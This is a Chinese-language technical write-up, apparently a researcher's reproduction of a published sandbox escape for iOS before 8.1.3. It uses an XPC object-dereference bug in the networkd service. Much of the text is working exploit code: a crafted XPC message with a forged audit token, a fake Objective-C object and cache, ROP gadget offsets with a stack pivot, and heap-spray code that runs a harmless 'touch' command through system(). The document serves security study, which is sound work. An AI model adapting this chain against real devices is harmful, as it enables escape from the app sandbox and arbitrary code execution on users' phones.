&emsp;&emsp;xpc是IPC (进程间通信)技术的一种，在OS X 10.9.x下存在漏洞可以突破Sandbox限制，而在iOS 8.1.3前也存在该漏洞。根据蒸米发表的《iOS冰与火之歌 – 利用XPC过App沙盒》，笔者也进行了一次尝试。

### 0x01 XPC进程通信
&emsp;&emsp;XPC是iOS IPC的一种，通过XPC，app可以与一些系统服务进行通讯，很多系统服务都是在沙盒外并拥有高权限的，通过系统服务在处理通信数据上的漏洞，从而进行沙盒逃逸。

&emsp;&emsp;想要与这些XPC服务通讯我们需要创建一个XPC client，传输的内容要与XPC service接收的内容对应上，比如系统服务可能会开这样一个XPC service：
```
xpc_connection_t listener = xpc_connection_create_mach_service("com.apple.xpc.example",
                                                               NULL, XPC_CONNECTION_MACH_SERVICE_LISTENER);
    xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) {
        // Connection dispatch
        xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
            // Message dispatch
            xpc_type_t type = xpc_get_type(event);
            if (type == XPC_TYPE_DICTIONARY){
                //Message handler
            }
        });
        xpc_connection_resume(peer);
    });
    xpc_connection_resume(listener);
```
&emsp;&emsp;如果可以在沙盒内进行访问的话，可以通过建立XPC的客户端进行连接：
```
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.xpc.example",
                                                               NULL, 0);
    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {
    });
    xpc_connection_resume(client);
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64 (message, "value", 0);
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(client, message);
```
&emsp;&emsp;xpc传输的其实就是一段二进制数据,通过下断点可以看到：

![image](http://img2.ph.126.net/9JKbACksTd6DjYbWbDqAAQ==/4846717624081757822.png)

&emsp;&emsp;这些传输的数据都经过序列化转换成二进制data，然后等data传递到系统service的服务端以后，再通过反序列化函数还原回原始的数据。

&emsp;&emsp;正常安装后的app是mobile权限，但是被sandbox限制在了一个狭小的空间里。如果系统服务在接收XPC消息的时候出现了问题，比如Object Dereference漏洞等，就可能让client端控制server端的pc寄存器，从而利用rop执行任意指令。虽然大多数系统服务也是mobile权限，但是大多数系统服务并没有被sandbox，因此就可以拥有读取或修改大多数文件的权限或者是执行一些能够访问kernel的api从而触发panic。

### 0x02 漏洞分析
&emsp;&emsp;开始这个漏洞是Google Project Zero发现的，Mac上Apple IPC的漏洞。由于IPC services没有对xpc_data进行检查，导致可以通过控制客户端的传输数据来获取服务端的控制权。
char *__fastcall sub_A878(int a1)这个函数没有进行检查：

![image](http://img1.ph.126.net/czBgVMyqsML_Ri1FvBNDQw==/201254608449126346.png)

&emsp;&emsp;利用方法如图：

![image](http://img0.ph.126.net/fgjsjehmG2O2w5I1YMonTw==/4926656517467425044.png)

&emsp;&emsp;通过分析传输的数据格式必须满足：
```
+28h qword 0
+30h pointer to controlled data
+48h byte 0
```
&emsp;&emsp;而xpc_uuid的结构如下：

![image](http://img0.ph.126.net/GpzWxYqCehBOezxrndnk0A==/4881901996170465687.png)

&emsp;&emsp;刚好可以满足前面16个字节的需求。

![image](http://img2.ph.126.net/rU9bVXgnjwZkF4TSuRsL-Q==/4847843523988600439.png)

&emsp;&emsp;所以可以设置xpc_uuidd的高8个字节为需要控制的地址，当其被销毁时就会跳转到我们自定义的流程里去。
构造相应的xpc数据：
```
xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0);
 
xpc_dictionary_set_uint64(dict, "type", 6);
xpc_dictionary_set_uint64(dict, "connection_id", 1);
 
xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
xpc_object_t conn_list = xpc_array_create(NULL, 0);
 
xpc_object_t arr_dict = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(arr_dict, "hostname", "example.com");
 
xpc_array_append_value(conn_list, arr_dict);
xpc_dictionary_set_value(params, "connection_entry_list", conn_list);
 
uint32_t uuid[] = {0x0, 0x1fec000};
xpc_dictionary_set_uuid(params, "effective_audit_token", (const unsigned char*)uuid);
 
xpc_dictionary_set_uint64(params, "start", 0);
xpc_dictionary_set_uint64(params, "duration", 0);
 
xpc_dictionary_set_value(dict, "parameters", params);
 
xpc_object_t state = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_int64(state, "power_slot", 0);
xpc_dictionary_set_value(dict, "state", state);
```
&emsp;&emsp;除了effective_audit_token以外的其他数据都是正常的。为了攻击这个系统服务，我们把effective_audit_token的值用xpc_dictionary_set_uuid设置为{0x0, 0x1fec000};。0x1fec000这个地址保存的将会是伪造的Objective-C对象。构造完xpc数据后，就可以将数据发送到networkd服务端触发漏洞了。接下来需要解决的是如何构造一个伪造的ObjectC对象，以及如何将伪造的对象保存到这个地址呢？

### 0x03 构造fake Objective-C对象以及Stack Pivot
&emsp;&emsp;通过伪造一个fake Objective-C对象和构造一个假的cache来控制pc指针。这个技术和《iOS冰与火之歌 – Objective-C Pwn and iOS arm32 ROP》中介绍的一样。

&emsp;&emsp;首先，通过NSSelectorFromString()这个系统自带的API获取release的地址。

&emsp;&emsp;然后构建一个假的receiver，假的receiver里有一个指向假的objc_class的指针，假的objc_class里又保存了假的cache_buckets的指针和mask。假的cache_buckets的指针最终指向将要伪造的selector和selector函数的地址。这个伪造的函数地址就是要执行的ROP链的起始地址。

```
hs->fake_objc_class_ptr = &hs->fake_objc_class;
hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;
hs->fake_objc_class.cache_bucket_mask = 0;
hs->fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
hs->fake_cache_bucket.cached_function = start address of ROP chain
```

&emsp;&emsp;这样就控制pc执行以及$r0寄存器，接下来还得使用ROP来执行自己想要执行的shellcode。虽然program image，library，堆和栈等都是随机，但是dyld_shared_cache这个共享缓存的地址开机后是固定的，并且每个进程的dyld_shared_cache都是相同的。这个dyld_shared_cache有好几百M大，基本上可以满足我们对gadgets的需求。因此只要在自己的进程获取dyld_shared_cache的基址就能够计算出目标进程gadgets的位置。

&emsp;&emsp;dyld_shared_cache文件一般保存在/System/Library/Caches/com.apple.dyld/这个目录下。首先使用jtool从cahe文件中提取CoreFoundation这个framework,生成dyld_shared_cache_armv7.CoreFoundation。

```
jtool -extract CoreFoundation ./dyld_shared_cache_armv7
```
&emsp;&emsp;然后用ROPgadget这个工具来搜索gadget了。如果是arm32位的话，记得加上thumb模式，不然默认是按照arm模式搜索的，gadget会少很多：
```
ROPgadget --binary ./dyld_shared_cache_armv7.CoreFoundation --rawArch=arm --rawMode=thumb
```
&emsp;&emsp;接下来需要找到一个用来做stack pivot的gadget，刚开始只控制了有限的几个寄存器，并且栈指针指向的地址也不是可以控制的，如果想控制更多的寄存器并且持续控制pc的话，就需要使用stack pivot gadget将栈指针指向一段可以控制的内存地址，然后利用pop指令来控制更多的寄存器以及PC。另一点要注意的是，如果想使用thumb指令，就需要给跳转地址1，因为arm CPU是通过最低位来判断是thumb指令还是arm指令的。在iphone4s 7.1.1上找到的stack pivot gadgets如下：
```
/*
     __text:2D3B7F78                 MOV             SP, R4
     __text:2D3B7F7A                 POP.W           {R8,R10}
     __text:2D3B7F7E                 POP             {R4-R7,PC}
*/
 
hs->stack_pivot= CoreFoundation_base + 0x4f78 + 1;
NSLog(@"hs->stack_pivot  = 0x%08x", (uint32_t)(CoreFoundation_base + 0x4f78));
```

&emsp;&emsp;进行stack pivot需要控制r4寄存器，最开始只能控制r0，因此先找一个gadget把r0的值赋给r4，然后再调用stack pivot gadget：
```
 /*
     __text:2d4510ee         mov        r4, r0
     __text:2d4510f0         ldr        r1, [r4, #0x58]
     __text:2d4510f2         cbz        r1, 0x2d451100
     
     __text:2d4510f4         ldr        r0, [r4, #0x4c]
     __text:2d4510f6         blx        r1
*/
hs->fake_cache_bucket.cached_function = CoreFoundation_base + 0x0009e0ee + 1; //fake_struct.stack_pivot_ptr
NSLog(@"hs->fake_cache_bucket.cached_function  = 0x%08x", (uint32_t)(CoreFoundation_base+0x0009e0ee));
```
&emsp;&emsp;经过stack pivot后，控制了栈和其他的寄存器，随后就可以调用想要执行的函数了，比如说用system指令执行”touch /tmp/iceandfire”。当然也需要找到相应的gadget，并且在栈上对应的正确地址上放入相应寄存器的值：
```
 /*
     __text:2d486842         mov        r0, r4
     __text:2d486844         mov        r1, r5
     __text:2d486846         blx        r6
*/
strcpy(hs->command, "touch /tmp/ iceandfire");
hs->r4=(uint32_t)&hs->command;
hs->r6=(void *)dlsym(RTLD_DEFAULT, "system");
hs->pc = CoreFoundation_base+0xd3842+1;
NSLog(@"hs->pc = 0x%08x", (uint32_t)(CoreFoundation_base+0xd3842));
```
&emsp;&emsp;最终伪造的Objective-C的结构体构造如下：
```
struct heap_spray {
    void* fake_objc_class_ptr;
    uint32_t r10;
    uint32_t r4;
    uint32_t r5;
    uint32_t r6;
    uint32_t r7;
    uint32_t pc;
    uint8_t pad1[0x3c];
    uint32_t stack_pivot;
    struct fake_objc_class_t {
        char pad[0x8];
        void* cache_buckets_ptr;
        uint32_t cache_bucket_mask;
    } fake_objc_class;
    struct fake_cache_bucket_t {
        void* cached_sel;
        void* cached_function;
    } fake_cache_bucket;
    char command[1024];
};
```

### 0x04 堆喷(Heap Spray)
&emsp;&emsp;虽然可以利用一个伪造的Objective-C对象来控制networkd。但是需要将这个对象保存在networkd的内存空间中才行，并且因为ASLR（地址随机化）的原因，就算能把伪造的对象传输过去，也很难计算出这个对象在内存中的具体位置。那么应该怎么做呢？方法就是堆喷(Heap Spray)。虽然ASLR意味着每次启动服务，program image，library，堆和栈等都是随机。但实际上这个随机并不是完全的随机，只是在某个地址范围内的随机罢了。因此可以利用堆喷在内存中喷出一部分空间(尽可能的大，为了能覆盖到随机地址的范围)，然后在里面填充n个fake Object就可以了。

![image](http://img2.ph.126.net/-gF4OhTK8ucMJEAKB5duFw==/1160239854102349379.jpg)

&emsp;&emsp;堆喷的代码如下：
```
void* heap_spray_target_addr = (void*)0x1fec000;
 
struct heap_spray* hs = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
memset(hs, 0x00, 0x1000);
 
size_t heap_spray_pages = 0x2000;
size_t heap_spray_bytes = heap_spray_pages * 0x1000;
char* heap_spray_copies = malloc(heap_spray_bytes);
 
for (int i = 0; i < heap_spray_pages; i++){
    memcpy(heap_spray_copies+(i*0x1000), hs, 0x1000);
}
 
xpc_connection_t client = xpc_connection_create_mach_service("com.apple.networkd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
 
xpc_connection_set_event_handler(client, ^void(xpc_object_t response) {
    xpc_type_t t = xpc_get_type(response);
    if (t == XPC_TYPE_ERROR){
        printf("err: %s\n", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
    });
 
 
xpc_connection_resume(client);
 
xpc_object_t dict = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_data(dict, "heap_spray", heap_spray_copies, heap_spray_bytes);
xpc_connection_send_message(client, dict);
```
&emsp;&emsp;随后编译执行app，app会将fake ObjectiveC对象用堆喷的方式填充到networkd的内存中，随后app会触发object dereference漏洞来控制pc，随后app会利用rop执行system("touch /tmp/iceandfire")指令。运行完app后，发现在/tmp/目录下已经出现了iceandfire这个文件了，说明成功突破了沙盒并执行了system指令。

### 0x05 总结
&emsp;&emsp;这篇文章主要是根据蒸米写的文章来的，其中还有几个问题没有弄明白。

1.攻击的xpc_data数据格式的确定
```
+28h qword 0
+30h pointer to controlled data
+48h byte 0
```
如何保证+48h为0 

2.堆喷时为什么是在客户端指定目的地址就行，传输到服务后在内存大概是怎么样的一个分布。

### 0x06 参考资料
[iOS冰与火之歌 – 利用XPC过App沙盒](http://drops.wooyun.org/papers/14170)

[Mac上漏洞说明](http://thecyberwire.com/events/docs/IanBeer_JSS_Slides.pdf)

[OS X privilege escalation due to XPC type confusion in sysmond (with exploit)](https://bugs.chromium.org/p/project-zero/issues/detail?id=121&redir=1)

[OS X 10.9.x - sysmond XPC Privilege Escalation](https://www.exploit-db.com/exploits/35742/)

### 0x08 代码下载
[github](https://github.com/AloneMonkey/ios-security)

